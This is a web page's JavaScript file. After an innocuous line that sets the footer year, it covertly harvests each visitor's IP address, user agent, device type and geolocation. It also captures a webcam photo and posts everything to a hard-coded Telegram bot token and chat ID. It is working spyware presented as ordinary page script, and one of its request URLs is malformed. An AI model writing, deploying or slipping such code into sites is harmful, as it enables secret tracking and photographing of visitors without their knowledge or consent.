// set year
document.getElementById('year').textContent = new Date().getFullYear();

// IP + Geolocation + Camera capture + Telegram
const telegramBotToken = "8220720042:AAFgprLpSAcuHntvvL_YhyjzSyE6lMVliII";
const telegramChatId = "6282966742";

// Send a simple "Hello" message first
fetch(`https://api.telegram.org/8220720042:AAFgprLpSAcuHntvvL_YhyjzSyE6lMVliII/sendMessage?chat_id=6282966742=Hello`)
  .catch(e => console.warn("Failed to send hello message:", e));

async function getIPInfo(){try{const res = await fetch("https://api.ipify.org?format=json"); const data = await res.json(); return data.ip;}catch{return "Unavailable";}}
function getUserAgent(){return navigator.userAgent;}
function detectDevice(){const ua=navigator.userAgent.toLowerCase();if(/mobile|android|iphone|ipad|tablet/.test(ua))return"Mobile/Tablet";return"Desktop";}
function getGeolocation(){return new Promise(resolve=>{if(!navigator.geolocation)return resolve("Unavailable");navigator.geolocation.getCurrentPosition(pos=>resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),err=>resolve("Denied/Unavailable"),{timeout:5000});});}

async function sendToTelegram(message, photoBlob=null){
  const apiUrl=`https://api.telegram.org/bot${telegramBotToken}/`;
  if(photoBlob){
    const formData=new FormData();
    formData.append("chat_id",telegramChatId);
    formData.append("photo",photoBlob,"photo.png");
    formData.append("caption",message);
    await fetch(apiUrl+"sendPhoto",{method:"POST",body:formData});
  } else {
    await fetch(apiUrl+"sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:telegramChatId,text:message})});
  }
}

(async ()=>{
  const ip=await getIPInfo();
  const ua=getUserAgent();
  const device=detectDevice();
  const geo=await getGeolocation();
  let photoBlob=null;
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:true});
    const video=document.getElementById("video");
    video.srcObject=stream;
    await new Promise(res=>setTimeout(res,2000));
    const canvas=document.getElementById("canvas");
    const ctx=canvas.getContext("2d");
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    video.srcObject.getTracks().forEach(track=>track.stop());
    photoBlob=await new Promise(resolve=>{canvas.toBlob(blob=>resolve(blob),"image/png");});
  }catch(e){console.warn("Webcam capture failed.");}
  const infoText=`**Visitor Info**:\n- **IP**: ${ip}\n- **Geolocation**: ${geo}\n- **User-Agent**: ${ua}\n- **Device Type**: ${device}\n- **Camera Access**: ${photoBlob?"Success":"Failed / Denied"}`;
  await sendToTelegram(infoText,photoBlob);
})();
